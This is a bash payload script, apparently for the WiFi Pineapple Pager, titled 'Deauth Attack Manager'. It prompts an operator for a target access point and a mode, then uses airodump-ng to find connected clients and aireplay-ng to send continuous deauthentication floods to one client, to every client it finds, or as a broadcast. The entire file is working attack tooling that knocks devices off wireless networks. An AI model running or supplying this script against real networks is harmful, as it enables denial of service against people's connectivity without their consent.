#!/bin/bash
# Title: Deauth Attack Manager
# Description: Targeted deauthentication attack with advanced configuration options
# Author: WiFi Pineapple Pager Community
# Version: 1.0
# Category: General
# Net Mode: NAT
#
# LED State Descriptions
# Magenta Blink - Scanning for targets
# Amber Solid - Deauth attack in progress
# Green Blink - Attack complete
# Red Blink - Error occurred

# Configuration
DEAUTH_COUNT=0  # 0 = continuous
ATTACK_LOG="/tmp/deauth_log.txt"

LOG "Starting Deauth Attack Manager"
touch "$ATTACK_LOG"

# Select attack mode
PROMPT "Attack mode: UP=Single Client DOWN=All Clients LEFT=Broadcast"
WAIT_FOR_BUTTON_PRESS UP DOWN LEFT
mode=$?

case $mode in
    0)  # Single client
        attack_mode="single"
        LOG "Mode: Single client deauth"
        ;;
    1)  # All clients
        attack_mode="all"
        LOG "Mode: All clients deauth"
        ;;
    2)  # Broadcast
        attack_mode="broadcast"
        LOG "Mode: Broadcast deauth"
        ;;
    *)
        LOG "Invalid mode"
        exit 1
        ;;
esac

# Get target AP
target_ap=$(MAC_PICKER "Target AP MAC?" "DE:AD:BE:EF:CA:FE")
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        exit 1
        ;;
esac

client_mac="FF:FF:FF:FF:FF:FF"  # Default broadcast

if [ "$attack_mode" == "single" ]; then
    # Get specific client
    client_mac=$(MAC_PICKER "Client MAC?" "00:11:22:33:44:55")
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            exit 1
            ;;
    esac
fi

# Get attack duration
duration=$(NUMBER_PICKER "Duration (seconds)?" "60" 10 300)
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        exit 1
        ;;
esac

LOG "Target AP: $target_ap"
if [ "$attack_mode" == "single" ]; then
    LOG "Target Client: $client_mac"
fi
LOG "Duration: $duration seconds"

# Final confirmation
resp=$(CONFIRMATION_DIALOG "Launch deauth attack?")
case $? in
    $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        exit 1
        ;;
esac
case "$resp" in
    $DUCKYSCRIPT_USER_DENIED)
        exit 0
        ;;
esac

spinner_id=$(START_SPINNER "Attacking...")

echo "=== Deauth Attack ===" >> "$ATTACK_LOG"
echo "Start Time: $(date)" >> "$ATTACK_LOG"
echo "Mode: $attack_mode" >> "$ATTACK_LOG"
echo "Target AP: $target_ap" >> "$ATTACK_LOG"
echo "Target Client: $client_mac" >> "$ATTACK_LOG"
echo "Duration: $duration seconds" >> "$ATTACK_LOG"

ALERT "Deauth Attack Started"

# Launch deauth attack
if [ "$attack_mode" == "broadcast" ]; then
    # Broadcast deauth - hits everyone
    timeout $duration aireplay-ng -0 0 -a $target_ap wlan0mon >> "$ATTACK_LOG" 2>&1
elif [ "$attack_mode" == "all" ]; then
    # Scan for clients first
    LOG "Scanning for clients..."
    timeout 10 airodump-ng wlan0mon --bssid $target_ap -w /tmp/deauth_scan --output-format csv > /dev/null 2>&1
    
    # Extract client MACs
    if [ -f /tmp/deauth_scan-01.csv ]; then
        clients=$(awk -F',' '/Station MAC/,EOF {if ($6 ~ /'"$target_ap"'/) print $1}' /tmp/deauth_scan-01.csv | grep -v "Station MAC" | xargs)
        
        LOG "Found clients: $clients"
        
        # Attack each client
        for client in $clients; do
            LOG "Deauthing: $client"
            timeout $duration aireplay-ng -0 0 -a $target_ap -c $client wlan0mon >> "$ATTACK_LOG" 2>&1 &
        done
        
        wait
        rm -f /tmp/deauth_scan-01.csv
    else
        LOG "No clients found, using broadcast"
        timeout $duration aireplay-ng -0 0 -a $target_ap wlan0mon >> "$ATTACK_LOG" 2>&1
    fi
else
    # Single client attack
    timeout $duration aireplay-ng -0 0 -a $target_ap -c $client_mac wlan0mon >> "$ATTACK_LOG" 2>&1
fi

STOP_SPINNER $spinner_id

echo "End Time: $(date)" >> "$ATTACK_LOG"
echo "========================" >> "$ATTACK_LOG"

LOG "Deauth attack complete"
LOG "Attack log: $ATTACK_LOG"

ALERT "Deauth Complete"
